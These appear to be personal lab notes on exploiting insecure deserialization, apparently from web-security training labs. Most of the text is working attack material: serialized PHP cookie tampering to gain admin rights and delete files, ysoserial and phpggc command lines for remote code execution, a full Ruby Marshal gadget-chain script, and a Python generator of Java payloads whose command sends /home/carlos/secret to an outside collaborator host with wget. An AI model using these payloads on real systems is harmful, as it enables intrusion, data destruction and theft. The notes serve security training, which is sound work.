Checklist:
```
1. Decode Cookie
2. Try Changing values/data types and observer error
3. Are there any paths on the cookies
4. Are there interesting files exposed?
	1. Can you read them appending tilde (~)? GET /libs/CustomTemplate.php~
	2. Can you create a new object that get serialized?
	3. O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
5. Is it a java cookie? Try prebuilt gadgets with ysoserial
6. Is it a php obj cookie? Try gadgets of phpgcc
7. Is it Ruby? Try documented ruby gadgets of vakzz
```
##### Basic Example:
Decoded Cookie:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
Change admin value to 1 to gain admin privileges

##### Change data types:
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"iz8si09pn9qkciq8l74c75wmzxazhuqn";}
```
Change the length of user 6 to 13, and the name to administrator, remove access token and set it to i:0
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

##### Cookie has a value linked to a path, such as avatar
Change path to a file you want to delete:
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"npc3ok28hj1yx4cwp5cn51rilvztsmtx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
When you delete the acc also the path will be deleted

##### Arbitrary Object Injection php
Can you read them appending tilde (~)? GET /libs/CustomTemplate.php~
The file says that we can unlink a file if lock_file_path is present on the template
Create a new object that get serialized:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Replace it on the cookie b64 encoded

##### Exploiting Java deserialization with Apache Commons
If decode the cookie we see java lang but its not readeable, however, we can abuse pre built gadges:
Also it starts with rO0... to distinguish this cookies
rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBiNzlvcWtraDZnbTM0cWo2ejdkYm5penZjazQzMzdpaXQABndpZW5lcg%3d%3d

Use ysoserial.jar https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
```
/usr/lib/jvm/java-8-openjdk/bin/java -jar ysoserial-all.jar CommonsCollections4 'command' | base64 > payload
cat payload | tr -d '\n'
```
Send the payload url encoded in repeater


##### Exploiting PHP deserialization with a pre-built gadget chain
Notice that when we try to change the cookie value we get a php error:
PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7
A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`
with the secret key of the serialization
```
<td class="e">SECRET_KEY </td><td class="v">ygwtquy6ahff4bjcp8xhkcj4geomohqz 
```

and we get the tech: Symfony 4.3.6 framework
Use phpgcc to exploit this https://github.com/ambionics/phpggc
`./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'`
Construct the php object with the payload and the secret key:
`<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;`

php php-object-payload.php to get the cookie that is going to be used
send the cookie to solve the lab

##### Exploiting Ruby deserialization using a documented gadget chain

Notice that when decodig username variable is like @username, an indicator of ruby language
Here the script to save:
```rb
require 'base64'
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt") # change command here

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
Run it with docker:
```
docker run -it --rm --name my-running-script -v "$PWD":/usr/src/myapp -w /usr/src/myapp ruby:3.0 ruby marshalled.rb
```
URL encode the output in the cookie on repeater and send


script to brute force java:
```python
#!/bin/python3
import os, random

burp_collab_link = "6szviq1i5ag33um9o5ya4rox7odg19py.oastify.com" # Used in testing if the command executed # CHANGE

jar_filename = "ysoserial-all.jar"

filename = "exploitsInBase64.txt" # for writing the output
open(filename, 'w').close() # (clear/create) the file

# ysoserial Payloads that will be tried
payloads = ['AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']


# Generate Exploits
for p in payloads:
    # Distinguish the lookup command by adding a number before the burp collab link.
    rceCommand_nslookup = f"nslookup {p}.{burp_collab_link}"
    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"

    cmdOnServer =  rceCommand_exfiltrateFile # CHANGE

    os.system(f"echo \#{p} >> {filename}")

    ####### commment 1 of the commands # CHANGE
    # Gzip the base64
    command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"

    # base64 only
    # command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | base64 | tr --delete '\\n' >> {filename}"

    os.system(command)

    for i in range(2): os.system(f"echo >> {filename}") # write 4 lines
```